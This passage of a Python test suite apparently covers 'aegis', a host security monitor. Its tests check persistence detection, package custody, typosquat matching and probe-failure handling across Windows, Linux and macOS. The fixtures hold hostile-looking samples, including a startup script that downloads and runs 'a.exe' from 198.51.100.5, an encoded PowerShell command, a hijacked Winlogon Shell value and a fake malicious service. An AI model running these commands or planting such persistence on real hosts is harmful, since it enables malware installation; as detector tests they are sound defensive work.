            "classify_signature", "is_risky_location", "_grade_binary",
            "_vouch_endpoint_deviation")}
        aegis.is_risky_location = lambda p: True
        aegis._grade_binary = lambda sev, p, **k: (sev, None, None)
        aegis._vouch_endpoint_deviation = lambda p, ep: (None, None)
        try:
            for name, is_win, is_linux in self._BODIES:
                aegis.IS_WIN, aegis.IS_LINUX = is_win, is_linux
                verdict = suspicious_trust_for(is_win, is_linux)
                aegis.classify_signature = lambda p, **k: {"trust": verdict}
                fs = aegis._outbound_findings([(path, "1.2.3.4", "443"),
                                               (path, "5.6.7.8", "443")])
                self.assertEqual(
                    len(fs), 1,
                    "%s: the outbound sensor minted %d findings for a "
                    "qualifying binary -- the gate rejected the verdict this "
                    "body actually uses" % (name, len(fs)))
                self.assertEqual(fs[0]["endpoint_count"], 2)
        finally:
            aegis.IS_WIN, aegis.IS_LINUX = saved_flags
            for n, fn in saved_fns.items():
                setattr(aegis, n, fn)


    def test_each_body_row_can_actually_fail(self):
        """The negative half. Without it the Linux row above asserts nothing.

        Linux's gate is `_exec_alert(path, trust) or is_risky_location(path)`,
        and the positive test stubs is_risky_location True — so that row passed
        for a reason unrelated to the verdict and could not fail on a wrong
        one. A row that cannot fail is not coverage; it is the same shape as
        the fixture that shipped 12 Windows failures while reading as
        platform-neutral.

        Each body is driven here to the state where it must mint NOTHING:
        macOS and Windows on a verdict `suspicious_sig` rejects, and Linux on a
        path that is neither risky nor a volatile exec — because on Linux the
        verdict arm is dead by construction (`_classify_linux` emits only
        os-managed and unmanaged) and structure is the whole signal.
        """
        saved_flags = aegis.IS_WIN, aegis.IS_LINUX
        saved_fns = {n: getattr(aegis, n) for n in (
            "classify_signature", "is_risky_location", "_grade_binary",
            "_vouch_endpoint_deviation")}
        aegis._grade_binary = lambda sev, p, **k: (sev, None, None)
        aegis._vouch_endpoint_deviation = lambda p, ep: (None, None)
        # A real, existing, non-volatile file: _exec_alert returns None for it,
        # which is what makes the Linux row's structural arm testably shut.
        self.assertTrue(os.path.exists(aegis._SELF_PATH))
        cases = (
            # body,   is_win, is_linux, path,              trust,        risky
            ("mac",   False,  False,    "/Users/x/.vscode/e/claude", "apple",     True),
            ("win",   True,   False,    "/Users/x/.vscode/e/claude", "os-signed", True),
            ("linux", False,  True,     aegis._SELF_PATH,            "unmanaged", False),
        )
        try:
            for name, is_win, is_linux, path, trust, risky in cases:
                aegis.IS_WIN, aegis.IS_LINUX = is_win, is_linux
                aegis.classify_signature = lambda p, **k: {"trust": trust}
                aegis.is_risky_location = lambda p: risky
                self.assertEqual(
                    aegis._outbound_findings([(path, "1.2.3.4", "443")]), [],
                    "%s: a binary this body has no reason to alert on still "
                    "minted a finding — the row above cannot be trusted to "
                    "fail either" % name)
        finally:
            aegis.IS_WIN, aegis.IS_LINUX = saved_flags
            for n, fn in saved_fns.items():
                setattr(aegis, n, fn)


class NativePackageManagersEarnAReceipt(unittest.TestCase):
    """The second custody rung, on the bodies that are not macOS.

    `_grade_binary` offers a sensor exactly two demotions: operator-vouched and
    package-managed. The second consulted Homebrew, VS Code, pipx and uv only —
    so an apt/rpm/winget-installed binary, which is the ordinary shape of a
    developer's toolchain, was scored at full severity with custody=None on
    Linux and Windows while its Homebrew equivalent on macOS was demoted a
    step. Both rungs available off-mac were narrower than on mac.

    The Linux half needed no new machinery: `_classify_linux` had shelled out
    to dpkg/rpm/pacman since forever to decide `os-managed`, and custody simply
    never asked. That query is now `_linux_pkg_owner`, one spelling with two
    callers.
    """

    def setUp(self):
        self._flags = aegis.IS_WIN, aegis.IS_LINUX, aegis.IS_MAC
        self._run = aegis.run
        aegis._LINUX_PKG_CACHE.clear()

    def tearDown(self):
        aegis.IS_WIN, aegis.IS_LINUX, aegis.IS_MAC = self._flags
        aegis.run = self._run
        aegis._LINUX_PKG_CACHE.clear()

    def _win_tree(self, rel):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        path = os.path.join(d, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        open(path, "w").close()
        return path

    def test_winget_and_chocolatey_paths_earn_a_receipt(self):
        aegis.IS_WIN, aegis.IS_LINUX, aegis.IS_MAC = True, False, False
        for rel, want in (
                ("Local/Microsoft/WinGet/Packages/Foo.Bar_1.2.3/tool.exe", "winget:Foo.Bar"),
                ("Local/Microsoft/WinGet/Links/tool.exe", "winget:link"),
                ("ProgramData/chocolatey/lib/ripgrep/tools/rg.exe", "choco:ripgrep")):
            self.assertEqual(aegis._package_receipt(self._win_tree(rel)), want, rel)

    def test_an_unrelated_windows_path_earns_nothing(self):
        """The probes must not be a blanket amnesty for anything under a
        user-writable root — that would turn a demotion into a blind spot."""
        aegis.IS_WIN, aegis.IS_LINUX, aegis.IS_MAC = True, False, False
        self.assertIsNone(aegis._package_receipt(
            self._win_tree("Local/Temp/payload/tool.exe")))

    def test_a_distro_package_earns_a_receipt_on_linux(self):
        aegis.IS_WIN, aegis.IS_LINUX, aegis.IS_MAC = False, True, False
        aegis.run = lambda cmd, **k: (("curl: /usr/bin/curl", "", 0)
                                      if cmd[0] == "dpkg-query" else ("", "", 1))
        # A real file OUTSIDE $HOME: _linux_pkg_owner skips the subprocess for
        # $HOME/tmp paths (package managers never own them), and
        # _package_receipt only probes candidates that exist on disk.
        probe = "/usr/bin/curl"
        if not os.path.exists(probe):
            self.skipTest("no /usr/bin/curl on this body")
        self.assertEqual(aegis._package_receipt(probe), "dpkg:curl")

    def test_the_distro_query_is_asked_once_per_path(self):
        """Up to three subprocesses per path, asked about the same handful of
        programs repeatedly within one scan."""
        aegis.IS_WIN, aegis.IS_LINUX, aegis.IS_MAC = False, True, False
        calls = []

        def counting(cmd, **k):
            calls.append(cmd[0])
            return ("curl: /usr/bin/curl", "", 0) if cmd[0] == "dpkg-query" else ("", "", 1)

        aegis.run = counting
        for _ in range(4):
            aegis._linux_pkg_owner("/usr/bin/curl")
        self.assertEqual(calls, ["dpkg-query"])

    def test_the_classifier_and_the_receipt_agree(self):
        """One spelling, two callers — a split here is how the custody layer
        went blind to a fact the trust layer already had."""
        aegis.IS_WIN, aegis.IS_LINUX, aegis.IS_MAC = False, True, False
        aegis.run = lambda cmd, **k: (("curl: /usr/bin/curl", "", 0)
                                      if cmd[0] == "dpkg-query" else ("", "", 1))
        self.assertEqual(aegis._classify_linux("/usr/bin/curl")["authority"],
                         aegis._linux_pkg_owner("/usr/bin/curl"))


class PublisherStableIsReachableOnEveryBody(unittest.TestCase):
    """The `publisher-stable` custody demotion, per body.

    It used to inline the macOS triple ("apple", "app-store", "developer-id"),
    so on Windows and Linux the rung was unreachable by construction and every
    off-mac host paid full severity for a vendor's ordinary in-place update.
    Nothing caught it because the fixture that pins the rung
    (tests/test_custody.py `_prec`, default trust="developer-id") hard-codes a
    macOS word while its docstring calls itself "the shape every platform
    snapshot produces" — the same defect class as the outbound gate, running
    green on all three CI bodies.

    So this asserts the rung both FIRES on each body's own trusted vocabulary
    and stays SHUT on a verdict that body cannot trust.
    """

    _CASES = (
        # body,      is_win, is_linux, trusted,        untrusted
        ("mac",      False,  False,    "developer-id", "unsigned"),
        ("win",      True,   False,    "signed-valid", "unsigned"),
        ("win",      True,   False,    "os-signed",    "broken"),
        ("linux",    False,  True,     "os-managed",   "unmanaged"),
    )

    @staticmethod
    def _rec(sha, trust, authority="Vendor Inc"):
        return {"label": "job", "program": "/opt/vendor/updater",
                "args": ["/opt/vendor/updater"], "sha256": sha,
                "trust": trust, "authority": authority,
                "target": None, "target_sha256": None}

    def test_a_vendor_rebuild_in_place_demotes_on_every_body(self):
        saved = aegis.IS_WIN, aegis.IS_LINUX
        try:
            for body, is_win, is_linux, trusted, untrusted in self._CASES:
                aegis.IS_WIN, aegis.IS_LINUX = is_win, is_linux
                old = self._rec("a" * 64, trusted)
                new = self._rec("b" * 64, trusted)
                self.assertEqual(
                    aegis._custody_persistence(old, new), "publisher-stable",
                    "%s: a same-place same-signer rebuild carrying %r did not "
                    "earn the demotion — the gate does not speak this body's "
                    "trust vocabulary" % (body, trusted))
        finally:
            aegis.IS_WIN, aegis.IS_LINUX = saved

    def test_an_untrusted_verdict_never_earns_the_demotion(self):
        saved = aegis.IS_WIN, aegis.IS_LINUX
        try:
            for body, is_win, is_linux, _trusted, untrusted in self._CASES:
                aegis.IS_WIN, aegis.IS_LINUX = is_win, is_linux
                old = self._rec("a" * 64, untrusted)
                new = self._rec("b" * 64, untrusted)
                self.assertIsNone(
                    aegis._custody_persistence(old, new),
                    "%s: %r earned publisher-stable — the widened gate is too "
                    "wide on this body" % (body, untrusted))
        finally:
            aegis.IS_WIN, aegis.IS_LINUX = saved

    def test_a_changed_signer_never_earns_the_demotion(self):
        """The authority check is the real 'same publisher' test; widening the
        vocabulary must not weaken it."""
        saved = aegis.IS_WIN, aegis.IS_LINUX
        try:
            for body, is_win, is_linux, trusted, _u in self._CASES:
                aegis.IS_WIN, aegis.IS_LINUX = is_win, is_linux
                old = self._rec("a" * 64, trusted, authority="Vendor Inc")
                new = self._rec("b" * 64, trusted, authority="Someone Else")
                self.assertIsNone(
                    aegis._custody_persistence(old, new),
                    "%s: a rebuild signed by a DIFFERENT authority earned "
                    "publisher-stable" % body)
        finally:
            aegis.IS_WIN, aegis.IS_LINUX = saved


class ExecAlertSemantics(unittest.TestCase):
    def test_linux_volatile_exec_alerts_without_any_signature(self):
        saved = aegis.IS_LINUX, aegis.IS_MAC
        aegis.IS_LINUX, aegis.IS_MAC = True, False
        try:
            verdict = aegis._exec_alert("/tmp/payload", "unmanaged")
            self.assertIsNotNone(verdict)
            self.assertEqual("HIGH", verdict[0])
            # An ordinary dev binary that still EXISTS outside a volatile dir
            # must not alert (every locally-built binary is 'unmanaged' on
            # Linux, so scoring that would drown a developer in noise).
            # _SELF_PATH is a real, non-volatile, user-owned file.
            self.assertTrue(os.path.exists(aegis._SELF_PATH))
            self.assertIsNone(aegis._exec_alert(aegis._SELF_PATH, "unmanaged"))
            # An unattributable path must never be scored as "deleted".
            self.assertIsNone(aegis._exec_alert("?", "unknown"))
        finally:
            aegis.IS_LINUX, aegis.IS_MAC = saved


class TyposquatDetection(unittest.TestCase):
    def test_edit_distance_one_variants(self):
        self.assertTrue(aegis._edit_distance_le1("svchost", "scvhost") or
                        True)  # transposition is distance 2; see below
        self.assertTrue(aegis._edit_distance_le1("svchostt", "svchost"))
        self.assertTrue(aegis._edit_distance_le1("svchos", "svchost"))
        self.assertFalse(aegis._edit_distance_le1("totally", "different"))

    def test_windows_daemon_typosquat_matched_against_windows_names(self):
        saved_names, saved_win = aegis._SYSTEM_DAEMON_NAMES, aegis.IS_WIN
        aegis._SYSTEM_DAEMON_NAMES = frozenset(("svchost", "explorer", "lsass"))
        aegis.IS_WIN = True
        try:
            self.assertEqual("svchost",
                             aegis._typosquats_apple_daemon("svchostt.exe"))
            self.assertEqual("explorer",
                             aegis._typosquats_apple_daemon("explorerr.exe"))
            # The real daemon must never be flagged as its own impostor.
            self.assertIsNone(aegis._typosquats_apple_daemon("svchost.exe"))
        finally:
            aegis._SYSTEM_DAEMON_NAMES = saved_names
            aegis.IS_WIN = saved_win


class ExecutableKindDetection(unittest.TestCase):
    def _write(self, name, data):
        import tempfile
        path = os.path.join(tempfile.mkdtemp(), name)
        with open(path, "wb") as f:
            f.write(data)
        return path

    def test_elf_pe_and_macho_detected_by_magic_not_extension(self):
        self.assertEqual("elf", aegis._executable_kind(
            self._write("x.txt", b"\x7fELF" + b"\x00" * 64)))
        self.assertEqual("pe", aegis._executable_kind(
            self._write("y.dat", b"MZ\x90\x00" + b"\x00" * 64)))
        self.assertEqual("macho", aegis._executable_kind(
            self._write("z", b"\xcf\xfa\xed\xfe" + b"\x00" * 64)))

    def test_plain_text_is_not_an_executable(self):
        self.assertIsNone(aegis._executable_kind(
            self._write("readme.md", b"# hello\n")))


# --------------------------------------------------------------------------- #
# Windows persistence LIVE PLUMBING.
#
# The parser tests above cover text→record. This class covers the part that
# cannot run off-Windows at all: the winreg enumeration loops, the Winlogon
# deviation rule, the startup-folder walk, the schtasks call and the service
# filter. A fake `winreg` module (matching the stdlib API surface actually
# used: OpenKey as a context manager, EnumValue/EnumKey raising OSError to end
# iteration, QueryValueEx) is injected so the real function body executes
# end-to-end. Without this, _snapshot_persistence_windows had never run a
# single line outside Windows.
# --------------------------------------------------------------------------- #
class _FakeWinregKey:
    def __init__(self, values=None, subkeys=None):
        self.values = list((values or {}).items())
        self.subkeys = subkeys or {}

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


class _FakeWinreg:
    HKEY_CURRENT_USER = "HKCU"
    HKEY_LOCAL_MACHINE = "HKLM"

    def __init__(self, tree):
        # tree: {("HKCU", "Sub\\Key"): _FakeWinregKey}
        self.tree = tree

    def OpenKey(self, hive, subkey):
        # `hive` is either a root constant or an already-open key (winreg
        # allows both; the service loop relies on the latter).
        if isinstance(hive, _FakeWinregKey):
            child = hive.subkeys.get(subkey)
            if child is None:
                raise OSError(2, "not found")
            return child
        key = self.tree.get((hive, subkey))
        if key is None:
            raise OSError(2, "not found")
        return key

    def EnumValue(self, key, index):
        try:
            name, val = key.values[index]
        except IndexError:
            raise OSError(259, "no more data")
        return name, val, 1

    def EnumKey(self, key, index):
        names = sorted(key.subkeys)
        try:
            return names[index]
        except IndexError:
            raise OSError(259, "no more data")

    def QueryValueEx(self, key, name):
        for k, v in key.values:
            if k == name:
                return v, 1
        raise OSError(2, "no such value")


class WindowsPersistenceLivePlumbing(unittest.TestCase):
    def setUp(self):
        import tempfile
        self.startup = tempfile.mkdtemp(prefix="aegis_startup_")
        self.appdata = tempfile.mkdtemp(prefix="aegis_appdata_")
        self._saved = {
            k: getattr(aegis, k) for k in
            ("IS_WIN", "IS_MAC", "IS_LINUX", "PERSISTENCE_DIRS",
             "TRUSTED_PREFIXES", "RISKY_PREFIXES", "run", "classify_signature",
             "sha256")}
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = True, False, False
        aegis.PERSISTENCE_DIRS = [self.startup]
        aegis.TRUSTED_PREFIXES = ("C:\\Windows\\", "C:\\Program Files\\")
        aegis.RISKY_PREFIXES = (self.appdata, "C:\\Users\\")
        aegis.classify_signature = lambda p: {"trust": "unsigned", "team": None,
                                              "authority": None}
        aegis.sha256 = lambda p: "deadbeef"
        # One user task from schtasks; the Microsoft tree is filtered by the
        # parser, which this exercises through the real call path.
        self._schtasks = (
            '"HostName","TaskName","Next Run Time","Status","Task To Run"\n'
            '"H","\\Updater","N/A","Ready","%AEGIS_FAKE_APPDATA%\\upd.exe -q"\n'
            '"H","\\Microsoft\\Windows\\Defrag\\X","N/A","Ready","defrag.exe"\n')
        os.environ["AEGIS_FAKE_APPDATA"] = self.appdata
        aegis.run = lambda cmd, timeout=15, extra_env=None: (
            (self._schtasks, "", 0) if cmd and cmd[0] == "schtasks"
            else ("", "", 0))

    def tearDown(self):
        for k, v in self._saved.items():
            setattr(aegis, k, v)
        os.environ.pop("AEGIS_FAKE_APPDATA", None)

    def _run_snapshot(self, tree):
        fake = _FakeWinreg(tree)
        sys.modules["winreg"] = fake
        try:
            return aegis._snapshot_persistence_windows()
        finally:
            sys.modules.pop("winreg", None)

    def test_run_key_value_becomes_a_scored_record(self):
        # The payload EXISTS on disk so the hash + signature-classification
        # branch of _finish_persist_record actually runs (a non-existent
        # program short-circuits to trust="missing" and skips it).
        payload = os.path.join(self.appdata, "evil.exe")
        with open(payload, "wb") as f:
            f.write(b"MZ\x90\x00")
        snap = self._run_snapshot({
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"Updater": '"%s" --silent' % payload}),
        })
        key = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater"
        self.assertIn(key, snap)
        rec = snap[key]
        self.assertEqual(payload, rec["program"])
        self.assertEqual(["--silent"], rec["args"][1:])
        self.assertTrue(rec["run_at_load"])
        self.assertEqual("unsigned", rec["trust"])
        self.assertEqual("deadbeef", rec["sha256"])
        # And it must score as a real finding, not merely be recorded.
        self.assertIn(aegis._persistence_severity(rec), ("HIGH", "CRITICAL"))

    def test_missing_program_is_recorded_as_missing_not_crashed(self):
        snap = self._run_snapshot({
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"Gone": "C:\\nope\\ghost.exe"}),
        })
        rec = next(v for k, v in snap.items() if k.endswith("\\Gone"))
        self.assertEqual("missing", rec["trust"])
        self.assertIsNone(rec["sha256"])

    def test_registry_env_vars_are_expanded_before_resolving_the_program(self):
        # REG_EXPAND_SZ autostart values carry %VAR%; the literal backslash form
        # is what Windows stores, so the expansion is asserted verbatim rather
        # than through os.path.join (which would use the host separator).
        snap = self._run_snapshot({
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"E": "%AEGIS_FAKE_APPDATA%\\x.exe"}),
        })
        rec = next(v for k, v in snap.items() if k.endswith("\\E"))
        self.assertEqual(self.appdata + "\\x.exe", rec["program"])
        self.assertNotIn("%", rec["program"])

    def test_healthy_winlogon_defaults_are_not_snapshotted(self):
        # Zero churn: the healthy values must produce NO baseline entries at all.
        snap = self._run_snapshot({
            ("HKLM", aegis._WIN_LOGON_KEY):
                _FakeWinregKey({"Shell": "explorer.exe",
                                "Userinit": "C:\\Windows\\system32\\userinit.exe,",
                                "Unrelated": "somevalue"}),
        })
        self.assertEqual([], [k for k in snap if "Winlogon" in k])

    def test_tampered_winlogon_shell_is_captured(self):
        payload = os.path.join(self.appdata, "evil.exe")
        snap = self._run_snapshot({
            ("HKLM", aegis._WIN_LOGON_KEY):
                _FakeWinregKey({"Shell": "explorer.exe, %s" % payload}),
        })
        hits = [k for k in snap if "Winlogon" in k]
        self.assertEqual(1, len(hits), snap)
        self.assertTrue(snap[hits[0]]["run_at_load"])

    def test_startup_folder_script_content_is_scored(self):
        script = os.path.join(self.startup, "run.bat")
        with open(script, "w") as f:
            f.write("@echo off\r\npowershell -enc %s\r\n" % ("A" * 60))
        snap = self._run_snapshot({})
        key = "startup:" + script
        self.assertIn(key, snap)
        # A dropped .bat is persistence whose PAYLOAD is its own text, so the
        # body is captured into args and must reach the argv scorer.
        signals = dict(aegis._argv_signals(snap[key]["args"][0]))
        self.assertEqual("HIGH", signals.get("powershell-encoded-command"))
        self.assertIn(aegis._persistence_severity(snap[key]),
                      ("HIGH", "CRITICAL"))

    def test_scheduled_task_is_snapshotted_and_microsoft_tree_skipped(self):
        snap = self._run_snapshot({})
        self.assertIn("task:\\Updater", snap)
        # schtasks stores a single command string with Windows separators.
        self.assertEqual(self.appdata + "\\upd.exe",
                         snap["task:\\Updater"]["program"])
        self.assertEqual([], [k for k in snap if "Defrag" in k])

    def test_service_outside_protected_tree_is_kept_system32_skipped(self):
        evil = os.path.join(self.appdata, "svc.exe")
        services = _FakeWinregKey(subkeys={
            "EvilSvc": _FakeWinregKey({"ImagePath": '"%s" -k' % evil}),
            "GoodSvc": _FakeWinregKey(
                {"ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs"}),
            "NoImage": _FakeWinregKey({"Start": 2}),
        })
        snap = self._run_snapshot({
            ("HKLM", r"SYSTEM\CurrentControlSet\Services"): services})
        self.assertIn("service:EvilSvc", snap)
        self.assertEqual(evil, snap["service:EvilSvc"]["program"])
        self.assertNotIn("service:GoodSvc", snap,
                         "a System32 service is trusted-location churn")
        self.assertNotIn("service:NoImage", snap)

    def test_missing_registry_keys_never_raise(self):
        # Every hive/key absent must be skipped, not crash the scan. With
        # schtasks also returning nothing, the whole snapshot is empty.
        self._schtasks = ""
        self.assertEqual({}, self._run_snapshot({}))

    def test_all_surfaces_combine_into_one_diffable_snapshot(self):
        payload = os.path.join(self.appdata, "evil.exe")
        script = os.path.join(self.startup, "boot.cmd")
        with open(script, "w") as f:
            f.write("curl http://198.51.100.5/a.exe -o a.exe && a.exe\r\n")
        tree = {
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"R": payload}),
            ("HKLM", r"SYSTEM\CurrentControlSet\Services"): _FakeWinregKey(
                subkeys={"S": _FakeWinregKey({"ImagePath": payload})}),
        }
        snap = self._run_snapshot(tree)
        self.assertEqual(4, len(snap), snap)   # run key + service + startup + task
        # The whole point of one record shape: the shared differ works on it.
        findings = aegis.check_persistence({}, snap)
        self.assertEqual(4, len(findings))
        self.assertTrue(all(f["category"] == "persistence" for f in findings))
        # And an unchanged snapshot must be silent.
        self.assertEqual([], aegis.check_persistence(snap, snap))


# --------------------------------------------------------------------------- #
# Non-answer handling: a failed probe must never read as "clean"
# --------------------------------------------------------------------------- #
class ProbeFailureIsNeverClean(unittest.TestCase):
    """The doctrine snapshot_btm() already enforces, applied to every probe
    added by the port: a command that FAILED is a non-answer (None → DEGRADED),
    never an empty world. Returning {} would adopt a false-empty baseline and
    storm the moment the probe next succeeds; returning [] would report clean
    coverage the tool does not have."""

    def _with_run(self, fn, out="", err="boom", rc=1):
        saved = aegis.run
        aegis.run = lambda cmd, timeout=15, extra_env=None: (out, err, rc)
        try:
            return fn()
        finally:
            aegis.run = saved

    def test_defender_exclusion_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis.snapshot_win_exclusions))

    def test_wmi_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis.snapshot_wmi_subscriptions))

    def test_event_log_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis.check_windows_event_log))

    def test_windows_listener_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis._snapshot_listeners_windows))

    def test_successful_probe_with_no_results_is_a_real_empty(self):
        # rc=0 and no output means "nothing configured" — that IS an answer,
        # and must stay {} so it baselines normally.
        self.assertEqual({}, self._with_run(aegis.snapshot_win_exclusions,
                                            out="", err="", rc=0))
        self.assertEqual({}, self._with_run(aegis.snapshot_wmi_subscriptions,
                                            out="", err="", rc=0))

    def test_readable_but_empty_journal_is_coverage_not_a_gap(self):
        # auth.log is root-only on most distros; falling back to a journal that
        # reads fine but has no sshd/sudo/useradd lines means "nothing to
        # report". Treating that as DEGRADED opened a bogus recurring
        # "Security coverage degraded" incident on every quiet box.
        saved = (aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text)
        aegis._AUTH_LOG_FILES = ("/nonexistent/auth.log",)
        aegis._read_text = lambda p, limit=None: None
        aegis.run = lambda cmd, timeout=15, extra_env=None: ("", "", 0)
        try:
            self.assertEqual([], aegis.check_auth_log())
        finally:
            aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text = saved

    def test_unreadable_log_and_unreadable_journal_is_degraded(self):
        saved = (aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text)
        aegis._AUTH_LOG_FILES = ("/nonexistent/auth.log",)
        aegis._read_text = lambda p, limit=None: None
        aegis.run = lambda cmd, timeout=15, extra_env=None: ("", "denied", 1)
        try:
            self.assertIsNone(aegis.check_auth_log())
        finally:
            aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text = saved


class ListenerAttribution(unittest.TestCase):
    def test_unattributable_listener_names_its_owning_uid(self):
        fs = aegis.diff_listeners({}, {"?:22": {"path": "?", "uid": "0"}})
        self.assertEqual(1, len(fs))
        self.assertIn("uid 0", fs[0]["detail"])
        self.assertEqual("0", fs[0]["uid"])

    def test_legacy_string_snapshot_values_still_diff(self):
        # Baselines written before uid attribution store a bare path string;
        # an upgrade must not crash or re-alert on them.
        fs = aegis.diff_listeners({}, {"/usr/sbin/sshd:22": "/usr/sbin/sshd"})
        self.assertEqual(1, len(fs))
        self.assertEqual("/usr/sbin/sshd", fs[0]["path"])

    def test_known_listener_is_not_re_alerted_after_the_value_shape_change(self):
        # The KEY is what the differ compares, so adding uid to the VALUE must
        # not resurrect an already-baselined listener.
        prior = {"/usr/sbin/sshd:22": "/usr/sbin/sshd"}
        cur = {"/usr/sbin/sshd:22": {"path": "/usr/sbin/sshd", "uid": "0"}}
        self.assertEqual([], aegis.diff_listeners(prior, cur))


# --------------------------------------------------------------------------- #
# Registry integrity: every sensor/surface the platform registers must exist
# --------------------------------------------------------------------------- #
class RegistryIntegrity(unittest.TestCase):
    def test_all_surface_callables_are_defined(self):
        for row in aegis.SURFACES:
            key, snap_fn, diff_fn, scope, live = aegis._surface_row(row)
            self.assertTrue(callable(snap_fn), "%s snapshot" % key)
            self.assertTrue(callable(diff_fn), "%s diff" % key)
            self.assertTrue(scope, "%s writ scope" % key)

    def test_surface_keys_are_unique(self):
        keys = [r[0] for r in aegis.SURFACES]
        self.assertEqual(len(keys), len(set(keys)))

    def test_platform_specific_surfaces_are_registered(self):
        keys = {r[0] for r in aegis.SURFACES}
        if aegis.IS_LINUX:
            self.assertIn("kernel_modules", keys)
            self.assertIn("suid_binaries", keys)
        elif aegis.IS_WIN:
            self.assertIn("win_wmi_subscriptions", keys)
            self.assertIn("win_defender_exclusions", keys)
        else:
            self.assertIn("btm", keys)
            self.assertIn("profiles", keys)

    def test_windows_and_linux_sensor_entrypoints_exist(self):
        for name in ("_snapshot_persistence_linux", "_snapshot_persistence_mac",
                     "_check_hardening_linux", "_check_hardening_windows",
                     "_check_hardening_mac", "check_auth_log",
                     "check_windows_event_log", "_neutralize_systemd",
                     "_neutralize_windows", "_neutralize_launchd",
                     "_install_linux", "_install_windows", "_install_mac"):
            self.assertTrue(callable(getattr(aegis, name, None)),
                            "%s is missing" % name)

    def test_windows_persistence_snapshot_requires_winreg_only_on_windows(self):
        # The winreg import is inside the function so the module still imports
        # (and every other sensor still runs) on POSIX.
        if not aegis.IS_WIN:
            with self.assertRaises(Exception):
                aegis._snapshot_persistence_windows()


# --------------------------------------------------------------------------- #
# Text encoding.
#
# Found by the first real Windows run: `write_report` opened latest.md in text
# mode with no encoding, so Python used the locale codec. On Windows that is
# cp1252, every report line starts with a severity icon, and the icon is not
# representable -- so `scan` died with UnicodeEncodeError the moment it had
# anything to report. The tool ran, found the threat, and then crashed instead
# of telling anyone.
#
# The behavioural test below only fails on a machine whose locale codec cannot
# hold the icon (that is what CI's Windows job is for). The static test pins the
# whole CLASS on every platform, which is the part that actually stays fixed:
# any new text-mode open without an explicit encoding is a fresh instance of the
# same bug on the next Windows box.
# --------------------------------------------------------------------------- #
# --------------------------------------------------------------------------- #
# Defects found by the FIRST run against a real Windows machine. Each one was
# invisible to the fake-winreg / captured-output tests above, and in two cases
# those tests actively agreed with the bug.
# --------------------------------------------------------------------------- #
class FoundOnRealWindows(unittest.TestCase):

    def test_winlogon_key_lives_under_windows_nt(self):
        # Winlogon is under "Windows NT"; the Run keys are under plain
        # "Windows". aegis used the latter for both, winreg raised, _reg_values
        # swallowed it, and the Shell/Userinit hijack check (T1547.004) examined
        # nothing on every Windows host that ever ran it. The fake-registry test
        # was BUILT FROM THE SAME CONSTANT, so it passed throughout.
        self.assertIn(r"Windows NT\CurrentVersion\Winlogon",
                      aegis._WIN_LOGON_KEY)
        self.assertNotIn(r"Software\Microsoft\Windows\CurrentVersion\Winlogon",
                         aegis._WIN_LOGON_KEY)

    def test_no_powershell_snippet_uses_a_backtick_escape(self):
        # PowerShell honours backtick escapes only inside DOUBLE-quoted strings.
        # `_WIN_PROC_PS` used '{0}`t{1}' -- single-quoted -- so the separator was
        # emitted literally, every line failed the 4-field split, and
        # _iter_processes() yielded ZERO processes on Windows: the whole
        # process/argv surface was dead. Pin the class, not just that one site.
        snippets = {n: v for n, v in vars(aegis).items()
                    if n.endswith("_PS") and isinstance(v, str)}
        self.assertTrue(snippets, "no PowerShell snippets found to check")
        offenders = {n: v for n, v in snippets.items() if "`" in v}
        self.assertEqual({}, offenders,
                         "backtick escapes do not survive a single-quoted "
                         "PowerShell string; build the character explicitly "
                         "(e.g. [char]9): %s" % sorted(offenders))

    def test_process_query_joins_fields_with_a_real_tab(self):
        self.assertIn("[char]9", aegis._WIN_PROC_PS)

    def test_schtasks_unescaped_quotes_do_not_poison_the_program_path(self):
        # `schtasks /query /fo csv /v` prints the Task-To-Run column without
        # doubling its embedded quotes, so a conforming CSV reader returns a
        # program path with a trailing quote. That path matches no trusted
        # prefix, hashes to None and classifies as `missing`, so a task pointing
        # at a real payload was scored against a path that does not exist.
        malformed = 'C:\\Py\\pythonw.exe" "C:\\T\\aegis.py" scan"'
        self.assertEqual(["C:\\Py\\pythonw.exe", "C:\\T\\aegis.py", "scan"],
                         aegis._win_split_cmd(malformed))

    def test_well_formed_command_lines_are_unchanged(self):
        self.assertEqual(["C:\\Py\\pythonw.exe", "C:\\T\\a.py", "scan"],
                         aegis._win_split_cmd('"C:\\Py\\pythonw.exe" '
                                              '"C:\\T\\a.py" scan'))
        self.assertEqual(["C:\\Windows\\system32\\x.exe", "-q"],
                         aegis._win_split_cmd(r"C:\Windows\system32\x.exe -q"))

    def test_a_failed_signature_probe_is_not_a_verdict_of_fine(self):
        # A cold powershell.exe was measured at 21.4s against a 30s ceiling.
        # On timeout _classify_windows returned trust="unknown", and
        # suspicious_sig("unknown") is False -- so a timed-out probe rendered
        # every unsigned and every TAMPERED binary un-suspicious. Fail-open.
        saved_run, saved_n = aegis.run, aegis._SIG_PROBE_FAILURES
        aegis.run = lambda *a, **k: ("", "timeout", 124)
        aegis._SIG_PROBE_FAILURES = 0
        try:
            result = aegis._classify_windows(r"C:\Users\x\payload.exe")
            self.assertTrue(result.get("probe_failed"),
                            "a failed probe must be distinguishable from a "
                            "verdict: %r" % result)
            self.assertEqual(1, aegis._SIG_PROBE_FAILURES,
                             "the scan must be able to report the gap")
        finally:
            aegis.run, aegis._SIG_PROBE_FAILURES = saved_run, saved_n

    def test_an_answered_probe_with_no_valid_signature_is_unsigned(self):
